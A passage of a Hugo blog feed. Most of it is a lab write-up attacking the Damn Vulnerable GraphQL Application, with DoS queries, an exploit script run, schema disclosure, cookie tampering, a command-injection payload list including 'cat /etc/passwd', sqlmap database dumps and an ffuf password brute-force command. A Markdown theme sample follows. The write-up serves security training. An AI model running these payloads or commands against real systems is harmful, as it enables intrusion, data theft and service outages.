&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;inql &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5013&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;graphql &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;generate&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;cycles &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;o dvga_cycles
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This confirms what we found in GraphQL Voyager:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /tmp/dvga_cycles/127.0.0.1:5013
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cycles&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; OwnerObject -&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;paste&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;-&amp;gt; PasteObject -&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;owner&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;-&amp;gt; OwnerObject &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; OwnerObject -&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;pastes&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;-&amp;gt; PasteObject -&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;owner&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;-&amp;gt; OwnerObject &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can then exhaust system ressources using &lt;a href=&#34;https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/unsafe-circular-query.graphql&#34;&gt;Unsafe Circular Query&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Solution : the developper must set a value for &lt;code&gt;maxQueryDepth&lt;/code&gt;, determines how many query we can send in one request. For instance we can set &lt;code&gt;maxQueryDepth&lt;/code&gt;: 5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;3---field-duplucation-attack&#34;&gt;3 - Field Duplucation Attack&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_29_011345.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;home&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;hero&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tools&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;graphql&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;tools&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;Black&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Hat&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;GraphQL&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ch05&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;exploit_threaded_field_dup&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.1.26&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5013&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;graphql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This makes the app unresponsive. You can interrup the script with &lt;code&gt;CTRL-C&lt;/code&gt; to get your shell back. And you will also need to restart DVGA on your target VM.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ad-check&#34; data-lang=&#34;ad-check&#34;&gt;title: Solution
with **cost analysis** , this attack will not be as easy to carry out 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;4---aliases-based-attack&#34;&gt;4 - Aliases Based attack&lt;/h3&gt;
&lt;p&gt;GraphQL doesn’t like dealing with identical response keys and will generally complain if a query includes a given field name twice and you pass an argument with a different value for each.&lt;/p&gt;
&lt;p&gt;The difference is that using aliases will sometimes be more efficient, especially if a field de-duplication middleware is implemented. Note that a specific query middleware is needed on the GraphQL server to detect the use of aliases.&lt;/p&gt;
&lt;p&gt;This python one liner will generate a &lt;strong&gt;list of 1000 aliases&lt;/strong&gt; for you to crash the target&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;for i in range(0, 1000): print(&amp;#34;q&amp;#34;+str(i)+&amp;#34;:&amp;#34;+&amp;#34;systemUpdate&amp;#34;)&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;5---circular-fragment&#34;&gt;5 - Circular fragment&lt;/h3&gt;
&lt;p&gt;Here we are creating two fragments on the &lt;code&gt;PasteObject&lt;/code&gt; object style called &lt;code&gt;Start&lt;/code&gt; and &lt;code&gt;End&lt;/code&gt;, which call each other:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_29_012710.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;This will crash server instantly&lt;/p&gt;
&lt;p&gt;on a real target that uses a properly designed GraphQL engine, &lt;strong&gt;this attack should not work&lt;/strong&gt;. &lt;strong&gt;But Test IT !!!!&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;v---information-disclosure&#34;&gt;V - Information Disclosure&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-graphql&#34; data-lang=&#34;graphql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;__schema&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { name }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;mutation&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { name }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;subscription&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { name }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or for more schema infos :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-graphql&#34; data-lang=&#34;graphql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;__schema&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      kind
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      fields {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;mutation&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      kind
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      fields {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;subscription&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      kind
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      fields {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;If &lt;strong&gt;Introspection is Disabled&lt;/strong&gt; you cant do this&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So enumeration of fields and dynamic testing is required to understand the structure of the application.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Obtain GraphQL API schema even if the introspection is disabled&lt;/strong&gt;: &lt;a href=&#34;https://github.com/nikitastupin/clairvoyance&#34;&gt;clairvoyance&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;clairvoyance https://rickandmortyapi.com/graphql -o schema.json
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To get Docs in &lt;code&gt;/graphiql&lt;/code&gt; we need to do some &lt;strong&gt;Cookie Tampering&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Open browser dev-tools and change &lt;em&gt;Cookie&lt;/em&gt; &lt;code&gt;env = graphiql:disable&lt;/code&gt; to &lt;code&gt;env = graphiql:enable&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_29_015230.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;1---graphql-field-suggestions&#34;&gt;1 - GraphQL Field Suggestions&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;we can query something random and the server will suggest valid fields with similar names :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-graphql&#34; data-lang=&#34;graphql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;errors&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Cannot query field \&amp;#34;system\&amp;#34; on type \&amp;#34;Query\&amp;#34;. Did you mean \&amp;#34;pastes\&amp;#34;, \&amp;#34;paste\&amp;#34;, \&amp;#34;systemUpdate\&amp;#34; or \&amp;#34;systemHealth\&amp;#34;?&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;locations&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;line&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;column&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;vi---command-injection&#34;&gt;VI - Command Injection&lt;/h2&gt;
&lt;h3 id=&#34;1---fuzzing-for-command-injection&#34;&gt;1 - Fuzzing for Command Injection&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_144707.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Metacharacters:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;|
||
&amp;amp;
&amp;amp;&amp;amp;
&amp;#39;
&amp;#34;
;
&amp;#39;&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Payloads:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;whoami
id
cat /etc/passwd
uname -a
{&amp;#34;$where&amp;#34;: &amp;#34;sleep(1000) &amp;#34;}
;%00
-- -
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Disable Payload Encoding for both payloads&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_144311.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Start &lt;em&gt;Cluster Bomb&lt;/em&gt; Attack
&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_150346.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Look at resonses to see if there&amp;rsquo;s a command injection vector, since there is nothing,
&lt;strong&gt;We test another Parameter&lt;/strong&gt;, here we succeded in 2nd attempt:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_150732.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can test for SQL injection by adding a &lt;code&gt;&#39;&lt;/code&gt; to the string.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_145555.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2---exploiting&#34;&gt;2 - Exploiting&lt;/h3&gt;
&lt;p&gt;As we can see, we are able to perform sql injections in this string !&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_145806.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Copy as request and feed it to &lt;code&gt;sqlmap&lt;/code&gt; , you need to add &lt;code&gt;*&lt;/code&gt; in instead of &lt;code&gt;&#39;&lt;/code&gt; so that sqlmap procceses it&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_152154.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r req.txt -tables --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_152751.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now]]dump the&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r request.txt -dbms&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sqlite -dump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then check results in &lt;strong&gt;cli&lt;/strong&gt; or from &lt;strong&gt;files&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_152845.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;vii---xss-html-injection&#34;&gt;VII - XSS, HTML Injection&lt;/h2&gt;
&lt;p&gt;We &lt;strong&gt;create&lt;/strong&gt; or &lt;strong&gt;import&lt;/strong&gt; a &lt;em&gt;paste&lt;/em&gt; and set public to true so that we get victims :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_162009.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;The mutation have been accepted, we can go back to the website to check :
&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_162227.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;we could similarly inject an html payload in content argument if the server is not sanitizing the request :&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;h1&amp;gt;hello!&amp;lt;/h1&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;viii---graphql-query-deny-list-bypass&#34;&gt;VIII - GraphQL Query Deny List Bypass&lt;/h2&gt;
&lt;p&gt;Creating an &lt;strong&gt;allow-list&lt;/strong&gt; or &lt;strong&gt;deny-list&lt;/strong&gt; for GraphQL is a common technique to prevent malicious queries from being resolved by GraphQL.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_165718.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can bypass this by changing operation name :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_170146.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;bonus-tip&#34;&gt;[BONUS] Tip&lt;/h2&gt;
&lt;p&gt;By default, FFUF works in clusterbomb mode.&lt;br&gt;
If you want to scan in pitchfork mode, add the &lt;code&gt;-mode pitchfork&lt;/code&gt; flag to your command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -u http://targetwebsite.com -w /path/to/list/username.txt:FUZZ1 -w /path/to/list/password.txt:FUZZ2 -X POST -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username=FUZZ1&amp;amp;passwd=FUZZ2&amp;amp;submit=Submit&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span&gt; -mode pitchfork
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Showcase</title>
      <link>https://flowhero.github.io/newblog/showcase/</link>
      <pubDate>Mon, 11 Mar 2019 00:00:00 +0000</pubDate>
      
      <guid>https://flowhero.github.io/newblog/showcase/</guid>
      <description>&lt;p&gt;This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.&lt;/p&gt;</description>
      <content>&lt;p&gt;This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.&lt;/p&gt;
&lt;h2 id=&#34;headings&#34;&gt;Headings&lt;/h2&gt;
&lt;p&gt;The following HTML &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt;—&lt;code&gt;&amp;lt;h6&amp;gt;&lt;/code&gt; elements represent six levels of section headings. &lt;code&gt;&amp;lt;h1&amp;gt;&lt;/code&gt; is the highest section level while &lt;code&gt;&amp;lt;h6&amp;gt;&lt;/code&gt; is the lowest.&lt;/p&gt;
&lt;h1 id=&#34;h1&#34;&gt;H1&lt;/h1&gt;
&lt;h2 id=&#34;h2&#34;&gt;H2&lt;/h2&gt;
&lt;h3 id=&#34;h3&#34;&gt;H3&lt;/h3&gt;
&lt;h3 id=&#34;h4&#34;&gt;H4&lt;/h3&gt;
&lt;h4 id=&#34;h5&#34;&gt;H5&lt;/h4&gt;
&lt;h5 id=&#34;h6&#34;&gt;H6&lt;/h5&gt;
&lt;h2 id=&#34;paragraph&#34;&gt;Paragraph&lt;/h2&gt;
&lt;p&gt;Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.&lt;/p&gt;
&lt;p&gt;Itatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.&lt;/p&gt;
&lt;h2 id=&#34;images&#34;&gt;Images&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/newblog/img/terminal-theme.png&#34; alt=&#34;Terminal Theme Preview&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;figure-with-a-caption&#34;&gt;Figure with a caption&lt;/h3&gt;

  &lt;figure class=&#34;center&#34; &gt;
    &lt;img src=&#34;https://flowhero.github.io/newblog/img/terminal-theme.png&#34;  alt=&#34;Terminal Theme Preview&#34;   /&gt;
    
      &lt;figcaption class=&#34;center&#34; &gt;Terminal Theme Preview&lt;/figcaption&gt;
    
  &lt;/figure&gt;


&lt;h2 id=&#34;blockquotes&#34;&gt;Blockquotes&lt;/h2&gt;
